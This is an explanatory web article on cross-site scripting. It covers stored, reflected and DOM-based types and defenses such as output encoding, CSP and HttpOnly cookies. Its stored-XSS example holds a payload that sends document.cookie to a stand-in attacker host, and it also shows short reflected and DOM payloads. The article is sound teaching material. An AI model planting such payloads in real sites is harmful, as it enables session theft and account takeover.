---
title: What Is XSS: Cross-Site Scripting Types and Examples
description: Stored, reflected and DOM-based XSS explained with simple examples: how a malicious script reaches the page, what it can steal and how to encode output.
summary: XSS is a vulnerability that lets someone else's JavaScript run on your site in a user's browser. The core defense is encoding all data on output for its context: HTML, attribute, URL or script.
---

## What XSS is

**XSS (Cross-Site Scripting)** is a vulnerability where an attacker gets your site to deliver their JavaScript to users. The browser cannot tell that code apart from yours and runs it with the same privileges: access to the page, its data and actions on behalf of the user.

The cause is almost always the same: user-controlled data reaches the HTML **without encoding**, and the browser treats it as markup or code.

## Three types of XSS

| Type | Where the payload lives | How the victim gets it |
|---|---|---|
| **Stored** | In the database | Opens a normal page with infected content |
| **Reflected** | In a link or request | Clicks a crafted link |
| **DOM-based** | Handled only in the browser | The page's own JavaScript inserts data into the DOM |

### Stored XSS

An attacker posts a comment:

```html
<img src="x" onerror="fetch('https://evil.example/c?d='+document.cookie)">
```

If the site renders comments as HTML, the code runs for everyone who opens the page, admins included. This is the most dangerous type because it fires without any further action from the attacker.

### Reflected XSS

A search page prints the query: "Results for: …". The attacker sends the victim a link:

```text
https://shop.example/search?q=<script>/* malicious code */</script>
```

The server "reflects" the parameter into the response and the script runs. The link is usually hidden behind a URL shortener or a button in an email.

### DOM-based XSS

The server is not involved; the client code is vulnerable:

```js
// vulnerable: data from the URL is inserted as HTML
document.getElementById("greeting").innerHTML = location.hash.slice(1);
```

A link like `page.html#<img src=x onerror=alert(1)>` will execute code. Risky sinks include `innerHTML`, `outerHTML`, `document.write`, `eval` and `setTimeout` with a string.

## What an attacker can steal

The script runs in your site's context, so it can:

- **Hijack the session** if cookies lack `HttpOnly`, or grab tokens from `localStorage`.
- **Act as the user:** change email and password, transfer money, publish content.
- **Read page data:** private messages, payment details, documents.
- **Spoof the interface:** show a fake login form on your real domain.
- **Log keystrokes** and send them to the attacker's server.

## Defense principles

### Context-aware output encoding

The main rule: **encode data on output**, not only "clean" it on input. How depends on where the data lands:

| Context | What to do |
|---|---|
| Text inside HTML | Replace `<`, `>`, `&`, `"`, `'` with HTML entities |
| Attribute value | Always quote it, plus HTML encoding |
| URL in `href`/`src` | `encodeURIComponent` for parameters, allow only `http:` and `https:` |
| Inside `<script>` | Do not insert data directly; pass it via JSON or data attributes |
| CSS | Avoid user data in styles |

Modern template engines and frameworks (Jinja2, Blade, React, Angular) escape text by default. Vulnerabilities appear when someone turns that off.

### Extra layers

- **An HTML sanitizer** (such as DOMPurify) when users genuinely need to submit markup.
- **Content Security Policy** to block inline scripts and code from foreign domains.
- **Cookies with `HttpOnly`, `Secure` and `SameSite`** so scripts cannot read the session.
- **Input validation** helps, but never replaces encoding.

## Common mistakes

- Blocklists like "remove the word script". They are easily bypassed with event attributes and other tags.
- Using HTML encoding where data actually lands in a URL or JavaScript.
- Trusting data from "internal" sources: admin panels, the CRM, third-party APIs.

## FAQ

### If my site has no forms, is XSS impossible?

No. Data comes from more than forms: URL parameters, the URL hash, headers, external API responses, imported files.

### Does HTTPS protect against XSS?

No. HTTPS encrypts the connection, but the malicious script arrives from your own site over that same secure connection.

### What is self-XSS?

It is when a user is tricked into pasting code into the browser console. Technically it is social engineering rather than a site vulnerability, but a console warning helps.
